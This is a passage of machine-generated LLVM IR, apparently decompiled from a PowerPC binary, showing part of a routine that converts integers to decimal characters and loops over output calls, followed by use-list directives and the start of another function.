  %v1_1000a650 = icmp slt i32 %v0_1000a650, 0
  %v3_1000a650 = icmp eq i32 %v0_1000a650, 0
  store i1 %v1_1000a650, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a650, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a650, label %dec_label_pc_1000a66c, label %dec_label_pc_1000a658

dec_label_pc_1000a658:                            ; preds = %dec_label_pc_1000a650
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000a65c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a65c = add i32 %v1_1000a65c, 8
  %v3_1000a65c = inttoptr i32 %v2_1000a65c to i32*
  store i32 %v0_1000a65c, i32* %v3_1000a65c, align 4
  %v0_1000a660 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a660 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a660 = inttoptr i32 %v1_1000a660 to i32*
  store i32 %v0_1000a660, i32* %v2_1000a660, align 4
  %v0_1000a664 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a664 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a664 = add i32 %v1_1000a664, 4
  %v3_1000a664 = inttoptr i32 %v2_1000a664 to i32*
  store i32 %v0_1000a664, i32* %v3_1000a664, align 4
  %v0_1000a668 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a668 = add i32 %v0_1000a668, 12
  store i32 %v1_1000a668, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a66c

dec_label_pc_1000a66c:                            ; preds = %dec_label_pc_1000a650, %dec_label_pc_1000a658
  %v1_1000a694 = phi i32 [ %v1_1000a65c, %dec_label_pc_1000a650 ], [ %v1_1000a668, %dec_label_pc_1000a658 ]
  %v0_1000a66c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a66c = icmp slt i32 %v0_1000a66c, 103
  %v3_1000a66c = icmp eq i32 %v0_1000a66c, 103
  store i1 %v1_1000a66c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a66c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a66c, label %dec_label_pc_1000a674, label %dec_label_pc_1000a680

dec_label_pc_1000a674:                            ; preds = %dec_label_pc_1000a66c
  %v3_1000a674 = load i32, i32* %v2_1000a1b4, align 4
  store i32 %v3_1000a674, i32* %r0.global-to-local, align 4
  %v1_1000a678 = and i32 %v3_1000a674, 16
  store i32 %v1_1000a678, i32* %r9.global-to-local, align 4
  %v3_1000a678 = icmp eq i32 %v1_1000a678, 0
  br i1 %v3_1000a678, label %dec_label_pc_1000a6ac, label %dec_label_pc_1000a680

dec_label_pc_1000a680:                            ; preds = %dec_label_pc_1000a66c, %dec_label_pc_1000a674
  %v0_1000a680 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a680 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a680 = sub i32 %v1_1000a680, %v0_1000a680
  store i32 %v2_1000a680, i32* %r9.global-to-local, align 4
  %v1_1000a684 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a684 = icmp sgt i32 %v1_1000a684, %v2_1000a680
  %v4_1000a684 = icmp eq i32 %v1_1000a684, %v2_1000a680
  store i1 %v2_1000a684, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a684, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a684, label %dec_label_pc_1000a68c, label %dec_label_pc_1000a6ac

dec_label_pc_1000a68c:                            ; preds = %dec_label_pc_1000a680
  %v2_1000a68c = sub i32 %v1_1000a684, %v2_1000a680
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a694 = add i32 %v1_1000a694, 4
  %v3_1000a694 = inttoptr i32 %v2_1000a694 to i32*
  store i32 %v2_1000a68c, i32* %v3_1000a694, align 4
  store i32 ptrtoint (i32* @global_var_1000f83b.303 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a6a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a6a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a6a0 = inttoptr i32 %v1_1000a6a0 to i32*
  store i32 %v0_1000a6a0, i32* %v2_1000a6a0, align 4
  %v0_1000a6a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a6a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a6a4 = add i32 %v1_1000a6a4, 8
  %v3_1000a6a4 = inttoptr i32 %v2_1000a6a4 to i32*
  store i32 %v0_1000a6a4, i32* %v3_1000a6a4, align 4
  %v0_1000a6a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a6a8 = add i32 %v0_1000a6a8, 12
  store i32 %v1_1000a6a8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a6ac

dec_label_pc_1000a6ac:                            ; preds = %dec_label_pc_1000a680, %dec_label_pc_1000a674, %dec_label_pc_1000a68c
  %v1_1000a74037 = phi i32 [ %v1_1000a694, %dec_label_pc_1000a680 ], [ %v1_1000a694, %dec_label_pc_1000a674 ], [ %v1_1000a6a8, %dec_label_pc_1000a68c ]
  %v0_1000a6ac = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a6ac = icmp slt i32 %v0_1000a6ac, 102
  %v3_1000a6ac = icmp eq i32 %v0_1000a6ac, 102
  store i1 %v1_1000a6ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a6ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a6ac, label %dec_label_pc_1000a734, label %dec_label_pc_1000a6b4

dec_label_pc_1000a6b4:                            ; preds = %dec_label_pc_1000a6ac
  %v0_1000a6b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a6b4 = icmp slt i32 %v0_1000a6b4, 0
  %v3_1000a6b4 = icmp eq i32 %v0_1000a6b4, 0
  store i1 %v1_1000a6b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a6b4, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a6b4, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000a6b4, -1
  br i1 %tmp80, label %dec_label_pc_1000a6d0, label %dec_label_pc_1000a6c8

dec_label_pc_1000a6c8:                            ; preds = %dec_label_pc_1000a6b4
  %v1_1000a6c8 = sub i32 0, %v0_1000a6b4
  store i32 %v1_1000a6c8, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a6d0

dec_label_pc_1000a6d0:                            ; preds = %dec_label_pc_1000a6b4, %dec_label_pc_1000a6c8
  %v0_1000a6e431 = phi i32 [ %v0_1000a6b4, %dec_label_pc_1000a6b4 ], [ %v1_1000a6c8, %dec_label_pc_1000a6c8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a6d4 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000a6d4, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a6e4

dec_label_pc_1000a6e4:                            ; preds = %dec_label_pc_1000a6e4.backedge, %dec_label_pc_1000a6d0
  %v2_1000a704 = phi i32 [ %v3_1000a704, %dec_label_pc_1000a6e4.backedge ], [ %v2_1000a6d4, %dec_label_pc_1000a6d0 ]
  %v0_1000a6e8 = phi i32 [ %v0_1000a6e8.pre, %dec_label_pc_1000a6e4.backedge ], [ 2, %dec_label_pc_1000a6d0 ]
  %v1_1000a6e4 = phi i32 [ %v1_1000a6e4.pre, %dec_label_pc_1000a6e4.backedge ], [ 10, %dec_label_pc_1000a6d0 ]
  %v1_1000a6f8 = phi i32 [ %v0_1000a6e4.pre, %dec_label_pc_1000a6e4.backedge ], [ %v0_1000a6e431, %dec_label_pc_1000a6d0 ]
  %v2_1000a6e4 = sdiv i32 %v1_1000a6f8, %v1_1000a6e4
  store i32 %v2_1000a6e4, i32* %r0.global-to-local, align 4
  %v1_1000a6e8 = add i32 %v0_1000a6e8, 1
  store i32 %v1_1000a6e8, i32* %r7.global-to-local, align 4
  %v1_1000a6ec = icmp slt i32 %v1_1000a6e8, 3
  %v3_1000a6ec = icmp eq i32 %v1_1000a6e8, 3
  store i1 %v1_1000a6ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a6ec, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a6f4 = icmp slt i32 %v2_1000a6e4, 0
  %v2_1000a6f4 = icmp sgt i32 %v2_1000a6e4, 0
  %v3_1000a6f4 = icmp eq i32 %v2_1000a6e4, 0
  store i1 %v1_1000a6f4, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a6f4, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a6f4, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000a6e4, -10
  store i32 %v2_1000a6e4, i32* %r11.global-to-local, align 4
  %v2_1000a6f8 = add i32 %v1_1000a6f8, 48
  %v1_1000a700 = add i32 %v2_1000a6f8, %tmp81
  store i32 %v1_1000a700, i32* %r9.global-to-local, align 4
  %v1_1000a704 = trunc i32 %v1_1000a700 to i8
  %v3_1000a704 = add i32 %v2_1000a704, -1
  %v4_1000a704 = inttoptr i32 %v3_1000a704 to i8*
  store i8 %v1_1000a704, i8* %v4_1000a704, align 1
  store i32 %v3_1000a704, i32* %r10.global-to-local, align 4
  %v0_1000a708 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a708 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000a708 = or i1 %v0_1000a708, %v1_1000a708
  br i1 %v2_1000a708, label %dec_label_pc_1000a6e4.backedge, label %dec_label_pc_1000a70c

dec_label_pc_1000a6e4.backedge:                   ; preds = %dec_label_pc_1000a6e4, %dec_label_pc_1000a70c
  %v0_1000a6e4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a6e4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000a6e8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a6e4

dec_label_pc_1000a70c:                            ; preds = %dec_label_pc_1000a6e4
  %v0_1000a70c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000a70c, label %dec_label_pc_1000a710, label %dec_label_pc_1000a6e4.backedge

dec_label_pc_1000a710:                            ; preds = %dec_label_pc_1000a70c
  %v1_1000a710 = add i32 %v2_1000a704, -2
  store i32 %v1_1000a710, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000a718 = add i32 %v2_1000a704, -3
  store i32 %v1_1000a718, i32* %r11.global-to-local, align 4
  %v0_1000a71c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a71c = trunc i32 %v0_1000a71c to i8
  %v4_1000a71c = inttoptr i32 %v1_1000a710 to i8*
  store i8 %v1_1000a71c, i8* %v4_1000a71c, align 1
  %v0_1000a720 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a720 = trunc i32 %v0_1000a720 to i8
  %v2_1000a720 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a720 = add i32 %v2_1000a720, -1
  %v4_1000a720 = inttoptr i32 %v3_1000a720 to i8*
  store i8 %v1_1000a720, i8* %v4_1000a720, align 1
  %v0_1000a724 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a724 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a724 = inttoptr i32 %v1_1000a724 to i32*
  store i32 %v0_1000a724, i32* %v2_1000a724, align 4
  %v0_1000a728 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a728 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a728 = add i32 %v1_1000a728, 4
  %v3_1000a728 = inttoptr i32 %v2_1000a728 to i32*
  store i32 %v0_1000a728, i32* %v3_1000a728, align 4
  %v0_1000a72c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a72c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a72c = add i32 %v1_1000a72c, 8
  %v3_1000a72c = inttoptr i32 %v2_1000a72c to i32*
  store i32 %v0_1000a72c, i32* %v3_1000a72c, align 4
  %v0_1000a730 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a730 = add i32 %v0_1000a730, 12
  store i32 %v1_1000a730, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a734

dec_label_pc_1000a734:                            ; preds = %dec_label_pc_1000a6ac, %dec_label_pc_1000a288, %dec_label_pc_1000a710
  %v0_1000a7b0 = phi i32 [ %v1_1000a74037, %dec_label_pc_1000a6ac ], [ %v2_1000a294, %dec_label_pc_1000a288 ], [ %v1_1000a730, %dec_label_pc_1000a710 ]
  %v2_1000a734 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000a734, i32* %r9.global-to-local, align 4
  %v1_1000a744.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a738

dec_label_pc_1000a738:                            ; preds = %dec_label_pc_1000a738, %dec_label_pc_1000a734
  %v1_1000a744 = phi i32 [ %v2_1000a744, %dec_label_pc_1000a738 ], [ %v1_1000a744.pre, %dec_label_pc_1000a734 ]
  %v0_1000a738 = phi i32 [ %v1_1000a73c, %dec_label_pc_1000a738 ], [ %v2_1000a734, %dec_label_pc_1000a734 ]
  %v1_1000a738 = inttoptr i32 %v0_1000a738 to i32*
  %v2_1000a738 = load i32, i32* %v1_1000a738, align 4
  store i32 %v2_1000a738, i32* %r0.global-to-local, align 4
  %v1_1000a73c = add i32 %v0_1000a738, 12
  store i32 %v1_1000a73c, i32* %r9.global-to-local, align 4
  %v2_1000a740 = icmp ult i32 %v1_1000a73c, %v0_1000a7b0
  %v2_1000a744 = sub i32 %v1_1000a744, %v2_1000a738
  store i32 %v2_1000a744, i32* @r28, align 4
  br i1 %v2_1000a740, label %dec_label_pc_1000a738, label %dec_label_pc_1000a74c

dec_label_pc_1000a74c:                            ; preds = %dec_label_pc_1000a738
  %v4_1000a740 = icmp eq i32 %v1_1000a73c, %v0_1000a7b0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a740, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a74c = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000a7b0, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000a74c, 0
  %v1_1000a760 = zext i1 %tmp85 to i32
  store i32 %v1_1000a760, i32* %r9.global-to-local, align 4
  %v2_1000a764 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000a764, i32* %r0.global-to-local, align 4
  %v2_1000a768 = sub i32 %v2_1000a744, %v1_1000a760
  store i32 %v2_1000a768, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000a768, 1
  br i1 %tmp82, label %dec_label_pc_1000a7d4, label %dec_label_pc_1000a778

dec_label_pc_1000a778:                            ; preds = %dec_label_pc_1000a74c
  %v3_1000a778 = load i32, i32* %v2_1000a1b4, align 4
  store i32 %v3_1000a778, i32* %r0.global-to-local, align 4
  %v1_1000a77c = and i32 %v3_1000a778, 8
  store i32 %v1_1000a77c, i32* %r7.global-to-local, align 4
  %v3_1000a77c = icmp eq i32 %v1_1000a77c, 0
  br i1 %v3_1000a77c, label %dec_label_pc_1000a7a0, label %dec_label_pc_1000a784

dec_label_pc_1000a784:                            ; preds = %dec_label_pc_1000a778
  %v1_1000a788 = add i32 %v0_1000a7b0, 12
  store i32 %v1_1000a788, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1000f83b.303 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a790 = inttoptr i32 %v0_1000a7b0 to i32*
  store i32 160, i32* %v2_1000a790, align 4
  %v0_1000a794 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a794 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a794 = add i32 %v1_1000a794, 4
  %v3_1000a794 = inttoptr i32 %v2_1000a794 to i32*
  store i32 %v0_1000a794, i32* %v3_1000a794, align 4
  %v0_1000a798 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a798 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a798 = add i32 %v1_1000a798, 8
  %v3_1000a798 = inttoptr i32 %v2_1000a798 to i32*
  store i32 %v0_1000a798, i32* %v3_1000a798, align 4
  br label %dec_label_pc_1000a7d4

dec_label_pc_1000a7a0:                            ; preds = %dec_label_pc_1000a778
  %v1_1000a7a0 = add i32 %tmp, 16
  %v2_1000a7a0 = inttoptr i32 %v1_1000a7a0 to i32*
  %v3_1000a7a0 = load i32, i32* %v2_1000a7a0, align 4
  store i32 %v3_1000a7a0, i32* %r0.global-to-local, align 4
  %v1_1000a7a4 = icmp slt i32 %v3_1000a7a0, 48
  %v3_1000a7a4 = icmp eq i32 %v3_1000a7a0, 48
  store i1 %v1_1000a7a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a7a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a7a4, label %dec_label_pc_1000a7ac, label %dec_label_pc_1000a7c8

dec_label_pc_1000a7ac:                            ; preds = %dec_label_pc_1000a7a0
  %v3_1000a7ac = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000a7b0, i32* @r30, align 4
  %v2_1000a7b4 = add i32 %v3_1000a7ac, %v2_1000a768
  store i32 %v2_1000a7b4, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a7b4, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000a7d4

dec_label_pc_1000a7c0:                            ; preds = %dec_label_pc_1000a7dc
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000a810

dec_label_pc_1000a7c8:                            ; preds = %dec_label_pc_1000a7a0
  store i32 %v2_1000a744, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a7b0, i32* @r30, align 4
  br label %dec_label_pc_1000a7d4

dec_label_pc_1000a7d4:                            ; preds = %dec_label_pc_1000a74c, %dec_label_pc_1000a7ac, %dec_label_pc_1000a784, %dec_label_pc_1000a7c8
  store i32 0, i32* @r29, align 4
  %v2_1000a7d8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000a7d8, i32* @r31, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a7dc:                            ; preds = %dec_label_pc_1000a80c, %dec_label_pc_1000a7d4
  %v0_1000a7ec = phi i32 [ %v1_1000a7f8, %dec_label_pc_1000a80c ], [ %v2_1000a7d8, %dec_label_pc_1000a7d4 ]
  %v1_1000a7dc = inttoptr i32 %v0_1000a7ec to i32*
  %v2_1000a7dc = load i32, i32* %v1_1000a7dc, align 4
  store i32 %v2_1000a7dc, i32* %r4.global-to-local, align 4
  %v0_1000a7e0 = load i32, i32* @r27, align 4
  store i32 %v0_1000a7e0, i32* %r3.global-to-local, align 4
  %v1_1000a7e4 = add i32 %v0_1000a7ec, 4
  %v2_1000a7e4 = inttoptr i32 %v1_1000a7e4 to i32*
  %v3_1000a7e4 = load i32, i32* %v2_1000a7e4, align 4
  store i32 %v3_1000a7e4, i32* %r5.global-to-local, align 4
  %v0_1000a7e8 = load i32, i32* @r26, align 4
  store i32 %v0_1000a7e8, i32* %ctr.global-to-local, align 4
  %v1_1000a7ec = add i32 %v0_1000a7ec, 8
  %v2_1000a7ec = inttoptr i32 %v1_1000a7ec to i32*
  %v3_1000a7ec = load i32, i32* %v2_1000a7ec, align 4
  store i32 %v3_1000a7ec, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000a7e8)
  %v0_1000a7f4 = load i32, i32* @r31, align 4
  %v1_1000a7f4 = add i32 %v0_1000a7f4, 4
  %v2_1000a7f4 = inttoptr i32 %v1_1000a7f4 to i32*
  %v3_1000a7f4 = load i32, i32* %v2_1000a7f4, align 4
  store i32 %v3_1000a7f4, i32* %r0.global-to-local, align 4
  %v1_1000a7f8 = add i32 %v0_1000a7f4, 12
  store i32 %v1_1000a7f8, i32* @r31, align 4
  %v0_1000a7fc = load i32, i32* @r29, align 4
  %v1_1000a7fc = load i32, i32* %r3.global-to-local, align 4
  %v2_1000a7fc = add i32 %v1_1000a7fc, %v0_1000a7fc
  store i32 %v2_1000a7fc, i32* @r29, align 4
  %v2_1000a800 = icmp slt i32 %v1_1000a7fc, %v3_1000a7f4
  %v4_1000a800 = icmp eq i32 %v1_1000a7fc, %v3_1000a7f4
  store i1 %v2_1000a800, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a800, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a804 = load i32, i32* @r30, align 4
  %v2_1000a804 = icmp ult i32 %v1_1000a7f8, %v1_1000a804
  %v3_1000a804 = icmp ugt i32 %v1_1000a7f8, %v1_1000a804
  %v4_1000a804 = icmp eq i32 %v1_1000a7f8, %v1_1000a804
  store i1 %v2_1000a804, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000a804, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000a804, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000a800, label %dec_label_pc_1000a80c, label %dec_label_pc_1000a7c0

dec_label_pc_1000a80c:                            ; preds = %dec_label_pc_1000a7dc
  br i1 %v2_1000a804, label %dec_label_pc_1000a7dc, label %dec_label_pc_1000a810

dec_label_pc_1000a810:                            ; preds = %dec_label_pc_1000a80c, %dec_label_pc_1000a7c0
  %v0_1000a814 = phi i32 [ -1, %dec_label_pc_1000a7c0 ], [ %v2_1000a7fc, %dec_label_pc_1000a80c ]
  store i32 %v0_1000a164, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a814, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a814

; uselistorder directives
  uselistorder i32 %v0_1000a814, { 1, 0 }
  uselistorder i32 %v1_1000a7fc, { 2, 1, 0 }
  uselistorder i32 %v1_1000a7f8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_1000a7f4, { 1, 0, 2 }
  uselistorder i32 %v0_1000a7ec, { 0, 2, 1 }
  uselistorder i32 %v3_1000a7a0, { 1, 0, 2 }
  uselistorder i32 %v1_1000a760, { 1, 0 }
  uselistorder i32 %v2_1000a744, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000a73c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a738, { 1, 0 }
  uselistorder i32 %v0_1000a7b0, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000a704, { 1, 2, 0 }
  uselistorder i32 %v1_1000a6e8, { 1, 0, 2 }
  uselistorder i32 %v2_1000a6e4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000a6b4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000a684, { 2, 0, 1 }
  uselistorder i32 %v2_1000a680, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a5f0, { 1, 0 }
  uselistorder i32 %v2_1000a554, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000a528, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_1000a4f0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000a4e8, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1000a4b4, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1000a4a4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1000a498, { 1, 0, 2 }
  uselistorder i32 %v1_1000a47c, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1000a434, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000a424, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000a408, { 1, 0 }
  uselistorder i32 %v1_1000a3e4, { 1, 0 }
  uselistorder i32 %v2_1000a3c4, { 1, 0, 2 }
  uselistorder i32 %v0_1000a36c, { 1, 0 }
  uselistorder i32 %v1_1000a1d0, { 1, 0 }
  uselistorder i32 %v0_1000a25c, { 2, 1, 0 }
  uselistorder i32 %v1_1000a1a4, { 1, 0 }
  uselistorder i32 %v1_1000a184, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 1, 2, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 36, 37, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 27, 25, 28, 29, 26, 31, 30, 32, 33, 34, 35, 38 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000f838.301 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7d4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a734, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a6e4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a680, { 1, 0 }
  uselistorder label %dec_label_pc_1000a66c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a650, { 1, 0 }
  uselistorder label %dec_label_pc_1000a628, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a608, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a5e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a5c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a538, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a4d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a494, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a458, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a42c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a40c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a398, { 1, 0 }
  uselistorder label %dec_label_pc_1000a288, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1a8, { 1, 0 }
}

define i32 @function_1000a828(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a828:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000a828 = load i32, i32* @lr, align 4
  store i32 %v0_1000a828, i32* %r0.global-to-local, align 4
  %v0_1000a830 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a83c = add i32 %tmp, 16
  %v3_1000a83c = inttoptr i32 %v2_1000a83c to i32*
  %v4_1000a83c = load i32, i32* %v3_1000a83c, align 4
  store i32 %v4_1000a83c, i32* %r9.global-to-local, align 4
